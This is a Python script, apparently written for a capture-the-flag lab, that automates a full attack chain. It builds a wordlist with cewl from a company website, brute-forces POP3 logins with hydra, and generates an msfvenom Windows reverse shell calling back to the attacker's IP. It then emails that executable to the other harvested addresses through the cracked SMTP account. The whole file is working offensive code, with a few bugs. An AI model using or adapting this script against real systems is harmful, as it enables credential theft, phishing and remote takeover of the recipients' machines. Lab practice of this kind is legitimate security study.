#!/usr/bin/python3

import requests
import subprocess
import sys 
import re


# Print emails in file user-mails.txt
def read_emails_list(file_path):
    print("Notice:Reading file user-mails.txt containing emails:")
    with open(file_path,'r') as file:
        emails = file.readlines()
        for email in emails:
            print(email.strip())

# Print notice to execute tool crewl
def create_wordlist_with_cewl():
    url = "https://brownbrick.co/"
    print(f"Execute command:cewl --lowercase {url} > passwords.txt")
    try:
        subprocess.run(f"cewl --lowercase {url} > passwords.txt", shell=True, check= True)
        print("Finish create file passwords.txt")
    except subprocess.CalledProcessError as e :
        print("Have error when execute command:", e)

def brute_smtp_by_hydra(ip):
    print(f"Execute command: hydra -L user-mail.txt -P passwords.txt {ip} pop3 ")
    try:
        result = subprocess.run(f"hydra -L user-mail.txt -P passwords.txt {ip} pop3", shell=True, check=True, capture_output=True, text=True)
        output = result.stdout
        print("Hydra output:\n", output)

        # Kiểm tra kết quả trong output của Hydra
        lines = output.splitlines()
        for line in lines:
            # Tìm dòng có thông tin login và password hợp lệ
            if "login:" in line and "password:" in line:
                # Tách thông tin username và password
                parts = line.split()
                print(f"Parts: {parts}")
                if len(parts) > 3:
                    user_login_smtp = parts[4]
                    pass_login_smtp = parts[6]
                    print(f"Found valid credential: {user_login_smtp}:{pass_login_smtp}")
                    # Tạo payload và gửi email
                    create_payload_and_send_email(user_login_smtp, pass_login_smtp)
                    return 

        print("No valid login found by Hydra")

    except subprocess.CalledProcessError as e:
        print("ERROR:", e)

        
def create_payload_and_send_email(user_login_smtp,pass_login_smtp):
    with open("user-mail.txt", "r") as f:
        lines  = f.readline()
    with open("user-mail2.txt", "w") as f:
        for line in lines:
            if user_login_smtp not in line.strip():
                f.write(line)
    print("Email removed and saved to user-mail2.txt")
    # Tạo payload với msfvenom
    my_ip = subprocess.run("ifconfig tun0 | grep 'inet ' | awk '{print $2}'", shell=True, capture_output=True, text=True).stdout.strip()
    print(f"Generated IP for LHOST: {my_ip}")

    msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={my_ip} LPORT=8000 -f exe -o shell.exe"
    subprocess.run(msfvenom_command, shell=True)
    print("msfvenom shell.exe created")

    # In yêu cầu chạy nc
    print("Run the following command in your terminal to listen for reverse shell:")
    print("nc -lvnp 8000")

    # Gửi email với shell.exe đính kèm
    send_email_command = f"""for email in $(cat user-mail2.txt); do sendemail -f "{user_login_smtp}" -t "$email" -u "test" -m "test" -a shell.exe -s 10.10.231.161:25 -xu "{user_login_smtp}" -xp "{pass_login_smtp}";done"""
    print("Executing sendemail command:")
    subprocess.run(send_email_command, shell=True)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Cách sử dụng: python3  script.py [IP_ADDRESS]")
        sys.exit(1)

    # Nhận địa chỉ IP từ dòng lệnh
    ip_address = sys.argv[1]

    # Đọc danh sách email từ file user-mail.txt
    read_emails_list('user-mail.txt')

    # Thực hiện lệnh cewl
    create_wordlist_with_cewl()

    # Tạo lệnh hydra với địa chỉ IP đầu vào
    brute_smtp_by_hydra(ip_address)
